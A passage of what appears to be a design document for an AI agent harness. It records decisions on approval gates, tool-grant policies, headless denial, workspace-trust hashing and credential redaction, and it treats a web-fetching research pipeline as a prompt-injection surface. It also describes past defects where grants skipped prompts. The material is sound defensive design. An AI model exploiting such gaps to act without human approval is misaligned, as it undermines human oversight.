| **J9** | **The todo list works HEADLESS**, amending AC2 | AC2 says "both tools deny cleanly with no way to ask", written before this tool's shape was settled. The deny rule exists because a blocking prompt nobody answers turns into a hang — and this tool blocks on nothing and asks nobody. A research run keeping a checklist across ten passes is where one helps most, and ungating it is what makes it visible in a pass at all (§13 hides a gated tool rather than merely denying it) |
| **J10** | **A todo change travels as a `notice` KIND; the panel reads the list from thread state** | Discharges P1's deferred question without a new type. `notice` is already a kind-discriminated dict and `_run()` already yields it. The event says WHEN and `extra_data["todos"]` says WHAT, so the panel holds no authoritative copy and cannot disagree with the conversation. `LoopEvent`'s field set stays frozen. The forwarding is GENERIC — any tool result carrying a `notice` is forwarded and the key stripped — because the alternative was for `core/loop.py` to recognise `todo_write` by name, which is what `grant_scope` and `request_kind` exist to prevent |
| **J11** | **`with_todos` is a FOURTH parallel prompt tier; converging them stays deferred** | `with_memories`' docstring asks §23 to merge goal/skills/memories into one assembly point. They differ in signature (agent vs memory) *and* in conditionality — refs append unconditionally while memories are guarded — and AGENTS.md already records that asymmetry as needing its own test "because the edit looks right". Merging is a refactor with real regression risk and no AC behind it. Recorded so the fourth copy of K6's warning is a known cost, not an accident |
| **J12** | **Both tools are UNGATED** | Gating the question tool would mean approving a prompt in order to be shown a prompt — but the deciding reason is §13: it does not merely deny a gated tool where nothing can ask, it stops ADVERTISING it. Gated, `ask_user` would be invisible in every headless run, and AC2 requires it be visible, called, and answered with a denial the model can work around. `pin` is ungated for the same shape of reason (D26) |
| **J13** | **Whole-list write, not granular operations** | One call replaces the list, so it is always internally consistent and reordering is free. Granular add/complete/remove each need a stable way to name one item — the problem `clear_refs` refused to solve and §21b's "removal is by id, never by substring" rule exists to prevent. A model naming the wrong id silently mutates the wrong entry; a model rewriting the list cannot |
| **J14** | **`extra_data["todos"]`, not its own table** | `storage.get_thread_extra`'s docstring has named this tenant since §18, and §27's column-versus-`extra_data` argument was about keeping `list_threads()` cheap. A todo list is only ever read for the current thread, so queryability buys nothing. It shares the column under its own key beside §18's goal and §21c's refs |

### What the two parameters keep separate

§23 unified the MECHANISM, not the arguments. "May this edit be applied?" (`review`) stays supplied separately from "may this call proceed?" (`authorization.provider`), because `--review` without `--attended` is a legitimate combination and one shared object would make it unexpressible.

### Question tool

Up to 4 options, multi-select, a write-your-own answer, and a "chat about this" escape that returns control to the conversation instead of forcing a choice.

**Headless behaviour is decided (matches D26/`remember()`): with no response channel the call is DENIED**, and the model receives an error result it can work around. This is deliberate for the same reason `remember()` is: a ten-pass pipeline running unattended is exactly where a blocking prompt nobody will answer turns into a hang, and where an injected question from fetched web content would be least noticed.

**Amended by §25.** "The CLI and every research pass are headless" was true when this was written and is now conditional: a research run started with `--attended` carries an `ApprovalProvider` and *can* ask. The decision above is unchanged — the DEFAULT is still headless, and the deny-cleanly path is still what an unattended run gets — but the criterion below must be read as "with no way to ask" rather than "in the pipeline", or a question tool will be denied in an attended run where a human is sitting there waiting to answer it.

Per D24 the tool needs declared fields in both `ToolPermissions` and `ToolApprovals`, or the import-time check fails.

### Todo list tool

A model-maintained checklist, persisted per thread, rendered in a TUI panel whose placement (top / bottom / side) is a `tui.todo_position` preference. Needs an event so the panel re-renders on change. **§22 settled the event-shape question as P1** and froze `LoopEvent`'s field set, with a test that fails if it changes — so a todo event is a decision to make here, not a field to add quietly. `PipelineEvent`'s kind-discriminated shape is the precedent if this family grows the same way. (**Corrected in slice 2:** this said "six fields" and the field set is seven — `token_delta`, `tool_call_start`, `tool_result`, `permission_request`, `notice`, `final_response`, `stop_reason`. The test asserts SET EQUALITY, so the operative constraint is "frozen", not a count; J10 needed neither an addition nor a new type.)

Open question to settle at build time: whether the list is thread-scoped state in `ConversationThread.extra_data` or its own table. `extra_data` is the cheaper answer and the field was put there for this kind of thing -- note it is NO LONGER unused, since §18 shipped goal mode into it via key-scoped `set_extra()`, so a todo list would share the column under its own key.

### Acceptance criteria

1. `permission_channel` is one case of the general channel, not a second mechanism alongside it. **§25 added a second case that this must ABSORB rather than replace:** `core.approval.ApprovalProvider` — a caller-supplied `ask(tool_name, params, notice) -> bool` plus an `honour_run_scope` flag. It exists because `run_to_completion()` discards the `permission_request` event, so the CLI and the research pipeline (which drain the generator rather than watching it) would otherwise block on a queue with nothing displayed. Its `ask` signature is the request/response pair this section generalises; folding it in means one mechanism with three consumers, and NOT folding it in means the third bespoke channel this section exists to prevent.
1b. **Per-tool subagent sign-off is a named consumer of this channel.** (§25 R1 built the per-tool selection for *pipeline* grants, where the prompt is a shell-side question before the run rather than a mid-loop exchange — so it needed no channel and does not discharge this criterion.) The §14-§18 review shipped §18's sign-off as all-or-nothing (decision S1) precisely because the boolean channel cannot carry a list-out/subset-back exchange: approving a spawn authorises the child's entire approval-gated set. The per-tool version -- request carries the candidate tools, response carries the approved subset, and rejected names are removed from the child's `allowed_tools` -- is deliberately deferred here rather than built on a bespoke second channel. `ToolSpec.approval_notice` and `ToolSpec.grant_scope` already exist and generalise to it.
2. Both tools deny cleanly **with no way to ask** — no response channel and no `ApprovalProvider` — and say why. (Amended by §25: "in every pipeline pass" is no longer the same condition; an attended run can ask.) ✓ **for `ask_user`; AMENDED for the todo list by J10/J9** — a checklist asks nobody and blocks on nothing, so "deny cleanly" has nothing to deny. `todo_write` works headless deliberately. `ask_user` denies with an error naming the condition and telling the model to state its assumption, and stays ADVERTISED headless (J12) so the denial is reachable at all.
3. Both tools have declared permission/approval fields (D24). ✓ Both allowed, both ungated (J12/J9); `assert_permissions_declared` raises at import if either field goes missing, verified by removing one.
4. The todo panel re-renders from an event, not from polling. ✓ A `todo_changed` notice is the trigger; the panel re-reads `extra_data["todos"]` for the content (J10). Pinned by a test that sets the thread state, asserts the panel is STALE, then posts the event — so a polling implementation fails it.

**Slice 1 status:** AC1 ✓ (one mechanism, three consumers — approval, review, sign-off — plus §24's two). AC1b ✓ (`SubagentSignoffScreen`, the subset intersected with the offered candidates, and S1's scope amended per J8).

**Slice 2 status:** ACs 2–4 ✓. `ask_user` and `todo_write`, a new `QUESTION` kind whose answer is three-way (an option set / free text, a deferral, or nothing), and a TUI panel fed by a `notice` kind. **P1's deferred `LoopEvent`-vs-tagged-union decision is settled by J10 and needed neither option:** `notice` is already kind-discriminated, so the todo event added no field and no type, and `test_loop_event_did_not_grow_a_seventh_field` is untouched.

**Out of slice 2, recorded rather than dropped:** the CLI slash-command layer §21c's M21 deferred here (no AC, no decisions record, and neither tool needs it — the CLI reaches both through `build_attended_provider`), and the convergence of the four `with_*` prompt tiers (J11).

---

## 24. `/init` — generate the project's documentation set — BUILT

**Added during §16, built after §21c.** A command that reads the project and writes `.venastine/CONTEXT.md`, the free-text project context §14 already loads and injects into opted-in agents' prompts.

**Widened again in batch 50, on the user's report.** `.venastine/` was a configuration surface nothing could produce a starting file for: `settings.json` and `mcp.json` were documented in a README table and nowhere else, in a directory whose settings file RAISES on an unknown key. `/init` grew a third flag, independent of the two below, and I14-I17 record it.

**Widened at build time, on the user's correction.** The spec generated one file. What ships scaffolds a SET: `CONTEXT.md` is the hub and the only document inside `.venastine/`, and it links out to ordinary committed root documents — `ARCHITECTURE`, `ROADMAP`, `DEVLOG`, `TECHNICAL_DEBT`, `DOCUMENTATION_STANDARDS`, `TEST_WRITING`, `BREAKING_CHANGES` for a software project, or `RESEARCH_QUESTIONS`, `METHODOLOGY`, `SOURCES`, `FINDINGS`, `LIMITATIONS`, `EXPERIMENT_LOG`, `OPEN_QUESTIONS` plus the shared `DOCUMENTATION_STANDARDS` for a research one.

### Two interactions to design around, not discover

**Writing `CONTEXT.md` changes the workspace-trust hash.** D17 keys trust to a sha256 of everything under `.venastine/`, so generating this file invalidates the grant and the next run re-prompts. That is the trust system working exactly as designed — content changed, so consent is re-asked — but a `/init` that silently costs the user their trust grant is a bad experience. Either re-grant explicitly as part of the command (the user just authored the content, so consent is unambiguous) or tell them it will happen. Do not special-case `CONTEXT.md` out of the hash; that would put a hole in D17 for the convenience of one command.

**`write` is permission `False` by default.** §24 either runs through the existing `write` tool (and so needs approval, which is right for a command that writes into the project) or writes directly from the command handler. Prefer the former: a command that bypasses the tool permission layer to write files is a precedent worth not setting.

**Correction found at build time: neither option was available as written.** `write` is not merely `False` by default — it is unoverridable at runtime. `is_tool_allowed()` reads `config.ToolPermissions()` directly, `settings.json` has no `permissions` section and `_KNOWN_SETTINGS` raises on an unknown key, and D14 forbids a `ToolContext` widening anything, with the global check running first and unconditionally. `dispatch("write", …)` therefore raises `ToolCallDenied` before the `approval_callback` is ever consulted, for every user, out of the box. `read` is blocked identically, which also ruled out an agent that explores the project with the existing read tool. I1 and I2 are what the preference above became once that was true.

### Decisions record (I1–I17)

| # | Decision | Why |
|---|---|---|
| **I1** | A new narrowly-scoped **`write_project_doc`**, not `write`. It takes a document NAME from a fixed allowlist and has no path parameter at all | AC3 holds literally — dispatch, approval gate, `check_input_policy`, output redaction — without flipping a global or inventing a `permissions` config surface in the one file where project tier beats user tier. The destination is derived, so the tool cannot be aimed elsewhere |
| **I2** | A scoped **`read_project_doc`**, rather than flipping `ToolPermissions.read`. Allowed, no approval | Reading the project's own documents at the user's explicit request is not an escalation, and a gate would mean a dozen prompts per run — the shape of consent that gets clicked through. Flipping the global would hand every agent and all ten research passes standing file access. The readable set is DOCUMENTATION rather than "text files" because a permission-`True` tool is advertised to every run, not only `/init`'s |
| **I3** | Discovery is a **manifest injected into the user message**, built by a directory walk | No model call and no tool call, so two runs on an unchanged project produce byte-identical input — which is what makes the output diffable. Sizes are included because choosing what to read needs them: this repo's root markdown is 721 KB against a 20 KB per-read cap. Recursing for markdown was rejected; here it pulls in `prompts/`, `skills/builtin/` and `agents/builtin/`, which are harness assets competing for a bounded budget |
| **I4** | Regeneration **revises**; an existing `CONTEXT.md` is a labelled input | Hand edits survive by design rather than by the user rejecting a diff and re-applying them |
| **I5** | An existing file gets a **unified diff and an explicit yes**; with no way to ask, `/init` refuses | §25's V6, sixth instance: the inability to ask is not permission to proceed. No stored state — the diff comes from what is on disk |
| **I6** | Trust is re-granted **only if the project was already trusted** before the write | The user just authored the content, so consent is unambiguous — but `.venastine/` in an untrusted project may already hold agents, skills and an `mcp.json` that arrived with a cloned repo. Granting as a side effect of `/init` would wave all of it through: a hole in D17 opened from a direction the trust prompt never sees. `CONTEXT.md` is never special-cased out of the hash |
| **I7** | Three bounds: `INIT_TOKEN_BUDGET`, `INIT_READ_CHARS`, `INIT_MAX_STEPS` | TECHNICAL_DEBT item 9's meter re-counts the whole prompt every step, so a tool-heavy loop exhausts the chat budget in a handful of calls — §26 hit this exact profile and it is why research passes got their own. The three bound different things: total spend, per-read size, and the number of reads, which neither of the others limits |
| **I8** | The agent produces **text**; the shell writes | Consent belongs to the shell (§20's V3), and a tool writing from inside the loop could not show a human a diff first. `initializer.md` gets `read_project_doc` and nothing else |
| **I9** | `/init` scaffolds a **set**, with `CONTEXT.md` as the hub and the only document in `.venastine/` | The rest are ordinary committed root files, where humans reading the repo will find them. The one file every agent reads is also the map of the ones it does not |
| **I10** | `CONTEXT.md` is generated in full; the others are **structured stubs** | A DEVLOG written for a project with no history, or an ARCHITECTURE describing code an agent skimmed once, is confident fiction in files that then get committed, linked from the hub and read as established fact. An honest empty section outperforms a plausible wrong one |
| **I11** | The index is generated, and is a **pure function of the kind** | Found by running the command twice. An index that marked which documents already existed changed on the second run purely because the first had created them — rewriting `CONTEXT.md` for no reason and defeating the "nothing to do" path — and the mark was false, labelling documents `/init` had authored moments earlier as preserved pre-existing work. Which files a run left alone is a fact about that RUN, and belongs in its report |
| **I12** | An existing document is **never** overwritten by the stub path | Only `CONTEXT.md` goes through diff-and-confirm, because it is the only file `/init` claims to author |
| **I13** | **Detect-then-confirm** for an established project; **ask outright** for a blank folder | With no manifests, no source and no docs there is nothing to infer from, so a proposal would be a guess wearing a finding's clothes. The proposal is a Python heuristic rather than a model call — a code manifest is a strong, checkable signal, and the user confirms either way |
| **I14** | `--config` writes into `.venastine/` **directly**, under the same single consent, rather than through `write_project_doc` | That tool denies `.venastine/` by path segment and names these two files as the reason. Extending its allowlist was the alternative and is rejected below: `mcp.json` names a local command to execute, and a tool that can author one is advertised to every run and all ten research passes, not only to `/init`. Writing from the shell after an explicit yes is the shape `_settle_trust` already uses for the trust store |
| **I15** | The template is **every setting that has a shipped default**, at that default, with the values READ from the constants the loader resolves against | JSON has no comment syntax and `_validate_settings` raises on an unknown key, so the file cannot carry an explanation or an inert line — it IS the discoverable schema, and it has to be right the first time or the harness will not start in that directory. A retyped default is a second copy of it; `config_loader.shipped_defaults()` exists so there is one |
| **I16** | Six keys are **omitted because writing their own default is not restating it**, and the run reports what the file shadows in the user's own settings | Measured, not assumed: each key was written alone into a trusted project and the observable state diffed against a project with no file. `default_provider`/`default_model` are the `/model` store's staleness key, so adding them discards a remembered choice; `effort` flips `_effort_named` and makes every launch probe the provider's effort table; `compaction.trigger_tokens` is read by PRESENCE, so writing it silently disables the window-derived trigger; `ensemble_mode` and `research.subagent_review` are both `config.py if the value is None`, so an explicit `false` outranks config.py rather than deferring to it. What survives changes nothing until a human edits it — but a project settings.json still beats the user's by PRESENCE (D29), so the run names every key it takes over before it asks |
| **I17** | `--config` **alone is a different operation** — no kind question, no initializer, no spend — but not a different set of decisions | Two keyword flags on `generate()` rather than a second entry point beside it. A config-only path of its own would be a second answer to "is an existing file overwritten" and a second place to forget the trust settle, which is the split §24 exists to prevent. Named beside a kind it is both halves, under one consent |

### Rejected in batch 50

- **Adding `settings.json` and `mcp.json` to `write_project_doc`'s allowlist**, to keep AC3 literally
  true. The tool is advertised to every run; `mcp.json` names a local command to execute. A
  narrower gate on one command is not worth a wider capability on every other.
- **A template of `null`s**, so a key could be shown without being set. `_trigger_is_configured()`
  tests `"trigger_tokens" in ...` — presence, not value — so a null-valued template would read as
  a configured compaction trigger. Presence is load-bearing here, which is what I16 is about.
- **Writing the six non-inert keys anyway and warning about them.** The warning is real and would
  have been shown, but it makes `--config` a command that changes six things for someone who ran
  it to see the schema. A project settings.json is primarily for agents, skills and pipeline
  tuning; provider and model are the same across a user's projects, and stay in the user tier.

### Acceptance criteria

1. Running `/init` on a trusted project leaves it trusted, without weakening the content hash. ✓ (I6)
2. The generated file is the user's to edit — regeneration must not silently overwrite hand-edits without saying so. ✓ (I4 revises rather than replaces; I5 diffs and asks; I12 never touches the other documents)
3. The write goes through the permission layer. ✓ (I1) — **for the documents.** Batch 50's `--config`
   writes into `.venastine/`, which that layer refuses on purpose; I14 records what replaces it.
4. A scaffolded configuration changes nothing until it is edited. ✓ (I16), asserted over the whole
   observable set including the log, rather than key by key.

---

## 25. Authorized tool use in the research pipeline — BUILT

**Added and built after §18.** The ten-pass pipeline could not call **any** approval-gated tool, in any shell. This was structural, not a wiring oversight: `run_deep_research_mode` had no `permission_channel` parameter, so `_run()` always saw `None`, set `headless = True`, and `schemas(callable_only=True)` dropped every gated tool. Launching from the TUI's `/research` changed nothing. No MCP tool outside an `autoApprove` server was reachable from research, and neither was `spawn_subagent` after the §14–§18 review gated it. §15's `fetch_url` approval default was itself chosen around this limitation.

The goal was to lift that **without weakening the stance the harness holds**: no tool runs without an explicit human decision, the human sees what they are authorizing, and no lower-trust layer can loosen a gate (D14).

### The shape

Authorization is **two independent axes**, not a mode enum: a *grant set* (possibly empty) and an *`ApprovalProvider`* (possibly absent). Both absent is the default, and is exactly the pre-§25 behaviour — no existing invocation changes and no prompt appears unless one is asked for.

`core/approval.py` holds the data (`GrantBudget`, `ApprovalProvider`, `RunAuthorization`); `core/reasoning/authorization.py` holds the pipeline's policy and is shared by both shells; `core/loop.py` enforces; the shells build. The pipeline carries the bundle and interprets nothing.

### Decisions record (R1–R16)

| # | Decision |
|---|---|
| **R1** | **Per-tool selection**, not all-or-nothing. Unlike §18's S1, the pre-flight prompt is a shell-side question before the run, not the boolean `permission_channel` — so a subset is expressible here. |
| **R2** | **Only tools with no `approval_check` are name-grantable** (`registry.grantable`). A per-call gate was never consented to by name. **This narrows §18's shipped S1**, at the shared mechanism: a signed-off subagent calling `shell` now prompts its parent. |
| **R3** | `--grant` / `--grant-tools` are **per-run flags, never persisted**; `/research` takes the same values through the same parser. |
| **R4** | **`spawn_subagent` is excluded from pipeline grants.** Approving a spawn *is* the §18 sign-off, so pre-granting it unattended compounds one yes into unbounded delegated authority across ten passes. *(Carried by `ToolSpec.grant_policy` since R13; the `PIPELINE_UNGRANTABLE` frozenset this originally named is gone, and #67 found that the exclusion never reached the sign-off R4's own argument is about.)* |
| **R5** | **Argument-side content policy at `dispatch()`**, all tools, all modes, **refusing** rather than redacting. |
| **R6** | **`GrantBudget`**, `config.MAX_GRANTED_TOOL_CALLS = 150`, counting granted calls only. Exhaustion falls back to *asking*. One instance shared by reference across all passes. |
| **R7** | **Provenance framing** in the universal pass preamble. Defence-in-depth, explicitly **not** counted as a control. |
| **R8** | **No per-pass grant scoping.** The pass that wants a granted search tool is the pass ingesting the most untrusted content, so separation buys little for a per-pass `ToolContext` the orchestrator does not have. |
| **R9** | **Attended mode** via `ApprovalProvider`. Unanswered → **deny that call** after `config.ATTENDED_APPROVAL_TIMEOUT_S`, run continues. |
| **R10** | **Grants and attended compose.** Grants cover the boring set; anything ungranted asks instead of being denied. |
| **R11** | **Attended providers set `honour_run_scope = False`** — a mode whose purpose is granularity must not let one yes cover later calls. |
| **R12** | **The mode is persistable in `settings.json`; the grant list never is.** Asymmetric on purpose: a persisted mode can only ever ADD prompts, a persisted grant list only ever removes them — and `settings.json` is the one config file where project tier beats user tier. `research.granted_tools` is rejected *by name*. |
| **R13** | **Grant policy is DECLARED ON THE TOOL, in three values, and both grant paths read it** (`ToolSpec.grant_policy`; `GRANT_ANYWHERE` / `GRANT_SIGNOFF_ONLY` / `GRANT_NEVER`). Added after #67 and #133, which are one defect: `grantable()` was genuinely shared by the §18 sign-off and the §25 pipeline, but the *exclusions* lived in a frozenset in the pipeline's module, so the two disagreed about what a grant covers and a tool registered after the list was written joined the picker unasked. Three values rather than two booleans because the pipeline is **strictly stricter** than the sign-off, so the answers form an order — booleans could express "unattended yes, attended no", which is incoherent. Declared for **every** statically registered tool, not only gated ones, because gating is config-dependent and the policy must not be. `assert_grant_policy_declared()` raises at import for an undeclared **or misspelled** value: D24's trade, one question over, and a denylist's default of *grantable* is the silent-failure shape D24 exists to refuse. |
| **R14** | **A grant by name may not answer a question that carries a subject.** Extends J8, which keyed the sign-off memo by `(tool, subject)` after approving a spawn of agent `a` silently covered a later spawn of `b` — the *grant* branch of the same function went on answering for every subject, reaching J8's pre-fix behaviour by the other route. One condition (`subject is None`), local to `tools/context.py`: every tool but `spawn_subagent` memos under `None`, so the §25 grant mechanism is unchanged. Belt and braces after R13 made `spawn_subagent` `GRANT_NEVER`; it is a rule about grants rather than a restatement of one registration. |
| **R15** | **A grant is an answer given early, so the ADVERTISEMENT filter reads it too** (`schemas(…, granted=)`, `headless_hidden(…, granted=)`, sharing `_answered_by_grant`). `headless` asks *"can anything ask?"*; since §25 the question is *"can anything answer for this tool?"*, and #156 is the gap between those sentences — `--grant-tools` without `--attended` built a grant the enforcement path honoured and the filter never saw, so the run sent the model byte-identical tools to an unflagged one while the CLI printed that it had authorised something. **This is §25's own founding defect, unfixed on the path §25 was written for:** supplying a provider via `--attended` cleared `headless`, and grant-only never did, so AC2 was ticked and false for the unattended ten-pass case the section argues about throughout. The filter re-derives **both** `grantable()` (R2) and `grant_policy == GRANT_ANYWHERE` (R13) rather than trusting the set. `== GRANT_ANYWHERE`, not `!= GRANT_NEVER`, and the batch's own review is what corrected it: this filter is reached **only when the run is headless**, which is precisely the unattended case `GRANT_SIGNOFF_ONLY` exists to exclude — the looser test readmitted `write_project_doc` exactly where R13's argument was written against it, and disagreed with `candidates()`, which answers the same question. **#67/#133's own shape, reappearing inside the batch that generalised it.** Without the policy check at all, `spawn_subagent` slips through on a stale grant — it has no `approval_check`, so it *is* `grantable()` — and R14 would then refuse a tool the model had been shown. The **budget is deliberately not consulted**: advertisement is decided once per step, R6 makes exhaustion fall back to asking at *call* time, and retracting a tool mid-run reads to the model as the tool ceasing to exist. |
| **R15b** | **R13 also governs whether a grant already in hand APPLIES**, not only what may be offered. Batch 6 declared `grant_policy` and taught the two functions that decide what may be *offered* to read it; the loop's grant branch tested `grantable()` alone, so a grant naming `remember` — `GRANT_NEVER` under M17, and carrying no subject for R14 to catch — dispatched a durable cross-session write with **no prompt**. Enforced with `!= GRANT_NEVER` (not `== GRANT_ANYWHERE`, which is the *headless advertisement* question): a subagent legitimately holds a `SIGNOFF_ONLY` tool after a sign-off and must run it unprompted, since that is what the sign-off bought. **It must not reach the subject-keyed memo** — `spawn_subagent` is `GRANT_NEVER`, so testing the policy unconditionally stops §23's memo applying and the same agent is asked about twice in one turn. `recall_signoff` separates the two by what it returns: the memo always carries a subset, a name grant carries `None`, and the discriminator is `is None` rather than truthiness because an **empty** sign-off subset is a real answer. |
| **R16** | **A headless run cannot spawn at all**, and that is stated rather than emergent. `spawn_subagent` is approval-gated with no `approval_check`, so it lands in `headless_hidden` and is dropped from a headless schema list; every run that *can* spawn therefore has a channel, and `subagent_tool` forwards it. This is the half of r3-1 that was never written down — forwarding the channel is why a spawned child *keeps* its gated tools, and this is why the headless child is unreachable in the first place. It was derivable only by composing three separate facts, one config flag (`ToolApprovals.spawn_subagent=False`) removed it with the suite still green, and the one test in the area called `subagent_tool.run` directly, pinning *"if it happens it is safe"* while nothing pinned *"it does not happen"*. |

### Why the pipeline needed its own answer

It is the harness's highest prompt-injection surface by construction: it fetches web pages and feeds them to a model that then chooses tools, unattended, across ten passes. §23 reasoned identically when it decided the question tool denies headless. Two of the mitigations here are therefore not pipeline features at all but repairs to older gaps (R5): results were scanned for secrets and **arguments never were**, and `BLOCKED_DOMAINS` was enforced only by the two tools that opted into it.

### Acceptance criteria

1. An unflagged `--mode research` run behaves exactly as before: no prompt, no grants, every gated tool hidden. ✓
2. A granted tool is callable from a pass, and every use of it appears in `granted_calls.json`. ✓ *(Ticked at build time and **false for `--grant-tools` alone** until R15 — the tool was callable from `dispatch()` and never advertised to the pass, so the model was not told it existed. It held only with `--attended`, which is not the mode this section argues about. Re-verified at the wire: the tools argument reaching `call_model_stream` now carries the granted name with no channel.)*
3. A tool with an `approval_check` is never covered by a name-level grant, in the pipeline **or** in §18's subagent sign-off. ✓
4. Budget exhaustion asks (with a provider) or denies (without one) — never fails the run. ✓
5. Attended mode raises a prompt per call, ignores run-scope, and a timeout denies one call without killing the run. ✓
6. `research.granted_tools` in `settings.json` is rejected with a message explaining why it is absent. ✓
7. A credential-shaped argument, or a blocked-domain URL, is refused at `dispatch()` for a tool that imports nothing from `safety/`. ✓

---

## 26. Research legibility — pass internals, code stages, the claims view, colour, copy — BUILT

**Added after §22's first real ten-pass run**, which completed end to end and made five
things obvious that reading the code had not. All five are about *reading* a run rather
than running one, and they split cleanly: two are pipeline-level and reach both shells,
three are TUI presentation.

| # | What the run showed | Where it lives |
|---|---|---|
| 1 | Passes 4 and 6b appeared nowhere — and neither did D0, D1, D2 or Merge | `orchestrator.py` |
| 2 | A pass was opaque while it ran: fourteen tool calls over minutes looked like a hang | `core/loop.py` + `orchestrator.py` |
| 3 | Claims were readable only as prose; tier, grounding and assumption flags reached no shell | `tui/screens.py` |
| 4 | Everything was flat white, including the `you` label, which read as the first word of the message | `tui/themes.py` + `tui/widgets.py` |
| 5 | Text could not be selected at all | `tui/app.py` |

### Decisions record (L1–L6)

| # | Decision |
|---|---|
| **L1** | Tool calls and failed results reach the transcript; **streamed pass text does not**. Seven of the ten passes emit raw JSON, so streaming pass output buries the report under it. Only the volume escapes, as a throttled `pass_activity` total. This **amends §22 P2** — see the note in §22. |
| **L2** | **Every** zero-LLM stage is announced, not just the two that were noticed. D0/D1/D2/Merge were invisible for exactly the same reason, and fixing only the reported symptom leaves the panel with different gaps rather than none. `D2` emits once per **round**, not once per exhausted claim. |
| **L3** | Claims render in a scrollable modal (`/claims`, `ctrl+l`), taking plain dicts so the finished-run, stored-run and mid-run sources share one shape. |
| **L4** | Role-based palette resolved from the `Theme` object. Assistant label is `venastine ›`. |
| **L5** | `/copy [last\|report\|claims\|conversation\|all] [--file <path>]`. OSC 52 cannot be confirmed, so `--file` is the route that provably worked. **Amended in batch 48** with the fifth target: `all` is the superset and copies the harness's own lines with everything else (#140 decided that, and they are what reconstructs what happened), so the exchange without them is a target of its own rather than a narrowing of the one whose name says everything. `last` reads the transcript's entry log, not a field beside it. |
| **L6** | The CLI prints the new kinds too — a capability visible in one shell and not the other is the split this project keeps warning about. |

### What the build found

**There is no truthful step signal, so the feature became a different one.** §26 set out
to show "step N of a pass". `_run()` has no step marker to read: within a step it yields
`tool_call_start`/`tool_result` in pairs, and between steps it yields nothing at all
unless the model happened to stream text. Inferring a boundary from that interleaving
would be a guess presented as a fact, and a real marker means growing `LoopEvent`, which
P1's test forbids. So the panel counts `tool_call` events itself — derivation, not a
second writer — and `pass_activity` covers the passes that call no tools.

**Tool arguments were the one unredacted path.** §25 R5 added `check_input_policy()`,
but that **refuses** a call rather than redacting one, and `dispatch()`'s
`check_output_policy` only ever saw results — so a `fetch_url` whose url carried an API
key would have been printed verbatim in both shells the moment tool calls became
visible. Redaction runs before truncation, because truncating first can cut a credential
below the 20 characters its pattern needs.

**A `for` loop over a generator silently discards its return value**, and `thread_id` is
attached after the pass's loop finishes. `_translate` uses `next()` for that reason; the
`for`-loop version passes every test about tool events and breaks §3's JSON retry
invisibly.

**Twenty-two test doubles stopped intercepting, silently — again.** §22 recorded this
with twelve; §26 hit it with fifteen `run_deep_research_mode` patches plus seven more in
shared fixtures using a different spelling. Repointed through one `conftest.pass_stream`
helper rather than open-coded at each site, and the three transcript stubs needed the
new write methods for the same class of reason.

**`ctrl+k` would have been shadowed.** Textual's `Input` binds it to `delete_right_all`
and holds focus almost always, so the obvious key for a claims view would have silently
deleted the rest of the typed line. `ctrl+l` verified free against the installed version
per D22, and pinned by a test that presses the key with text in the input.

### Acceptance criteria

1. A pass's tool calls, and its failed results, reach a consumer as `PipelineEvent`s while the pass is still running — with parameters redacted. ✓
2. Every zero-LLM stage emits exactly one `stage` event; `D2` emits once per retry round however many claims it disposes of. ✓
3. `run_deep_research_mode()` is unchanged in signature and return type, and remains what every non-observing caller uses. ✓
4. Colour comes from theme variables only, so all eight themes restyle without edits, and a widget renders unstyled rather than raising when there is no running app. ✓
5. Text is retrievable from the session without terminal selection, by a route whose success is not overclaimed. ✓
6. Both shells render the new kinds. ✓

---

## 27. Thread legibility — resume actually resumes, and a thread knows what it is — BUILT

**Added after §26's first live TUI session.** Two bugs, both about threads, independent of
each other, and both found by using the app rather than by reading it.

| # | What the session showed | Where it lives |
|---|---|---|
| 1 | Resuming a thread (ctrl+t) displays nothing — and leaves the *previous* thread's transcript on screen under the new thread's id | `tui/app.py` + `tui/widgets.py` |
| 2 | The picker lists far more threads than there have ever been conversations | `storage.py` |

**Bug 1 is display-only.** `action_pick_thread`'s `chosen()` callback swaps `self.memory`,
refreshes the goal banner, writes `Resumed thread <uuid>.` and stops. The data loads
correctly — `ConversationMemory(thread_id=...)` reads the full history at construction —
but nothing renders it and nothing clears what was already on screen. `main.py`'s
`--thread` path has the identical gap, which §26's L6 makes in scope rather than optional.

**Bug 2 is not what it looks like.** `core/loop.py`'s `stream_deep_research_mode` builds a
bare `ConversationMemory()` per pass, so one research run creates ~10 threads, plus up to
4 more for the 6a/6c retry rounds, plus the §20 reviewer's. **That is a locked invariant,
not the defect** — "each pass gets its own fresh thread; passes share distilled JSON,
never raw history" is what stops a later pass reading how an earlier one argued. The
defect is that `ConversationThread` has no field saying what a thread *is*, so
`list_threads()` returns pass threads and conversations undifferentiated.

### Decisions record (T1–T9)

| # | Decision |
|---|---|
| **T1** | Threads carry a `kind` (`chat` / `research_pass` / `subagent`); the picker lists `chat` only. A **column**, not `extra_data` — that field exists and needs no migration, but it is an opaque JSON blob, so filtering would mean loading every row and testing in Python. `list_threads()` is the one query that must scale with a database gaining ten rows per run. |
| **T2** | Pass thread ids are recorded on the run (`PipelineRun.pass_threads`), so hiding a pass thread from the picker does not make it unreachable. A `list[dict]`, matching `granted_calls` and `subagent_reviews` — a nested dataclass would force every `vars(run)`/`vars(c)` site to `asdict()` in one change. |
| **T3** | Replay renders the **archive** (`storage.archive_history`), never the derived view. `memory.messages` begins with the synthesized `SUMMARY_PREFIX` message on any compacted thread, and replaying it would render harness-generated text under a `you ›` label — precisely what M8 says that message must never be mistaken for. |
| **T4** | Replay shows user/assistant text in full and each tool call as a one-line marker; tool **results** are skipped. A grounding-heavy thread would otherwise replay thousands of lines of fetched page text. |
| **T5** | Both shells replay. §26's L6 again. |
| **T6** | The legacy classification runs **at every launch**, from `main.py` right after `create_db_and_tables()` — not once behind a persisted marker, and not as an explicit command. It is idempotent by construction (it only ever moves rows still `chat` inside a *finished* run's window), so a repeat run is a no-op, there is no marker state to get wrong, and a database last opened by an older build is still classified. A command-only version leaves the picker cluttered until someone knows to run it, which is the bug. |
| **T7** | The §20 reviewer's thread is **`subagent`**, not a fourth kind. §20 already calls it a subagent and it runs through the same entry point. Consequence, accepted: the structural classifier labels *legacy* reviewer threads `research_pass` (they were created inside the run window) while new ones are `subagent` — the two disagree about old rows, and it does not matter, because both kinds are hidden from the picker. |
| **T8** | AC6's "reachable from the run" means **persisted and displayed**: `pass_threads` on the record, in `load_pipeline_run()`, and as `output/<run_id>/pass_threads.json`. Resuming by id already works for any kind (`get_thread()` does not filter), so `--thread <pass uuid>` needs nothing further. A picker mode listing every kind was rejected — it re-introduces the ten-rows-per-run list AC2 exists to remove, behind an opt-in nobody would want twice. |
